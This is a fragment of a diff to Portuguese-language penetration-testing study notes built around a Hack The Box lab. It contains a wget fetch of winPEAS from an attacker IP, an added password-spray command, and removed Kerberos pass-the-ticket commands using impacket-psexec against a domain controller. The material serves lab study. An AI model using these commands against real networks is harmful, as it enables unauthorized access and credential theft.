@@ -282,6 +282,10 @@ wget http://10.10.14.17/4-privilege%20escalation/winPEASx64.exe -o wp.exe
 ./wp.exe
 ```
 
+Spray-password
+
+    .\Spray-Passwords.ps1 -Pass Qwerty09! -Admin
+
 ## 4 - Manuseio de hashes e passwords
 
 ### Overpass the hash
@@ -321,10 +325,7 @@ python -c 'import hashlib,binascii; print(binascii.hexlify(hashlib.new("md4", "k
 ```
 ```
 export KRB5NAME=/home/acosta/owncloud/Area_de_trabalho/estudos/hack_the_box/scrambled/Administrator.ccache
-klist
-impacket-psexec -k -no-pass Administrator@dc01.scrm.local
 ```
-
 O ccache vai estar carregado e já podemos utilizá-lo para autenticarmos via Kerberos
 
 ### pass the hash
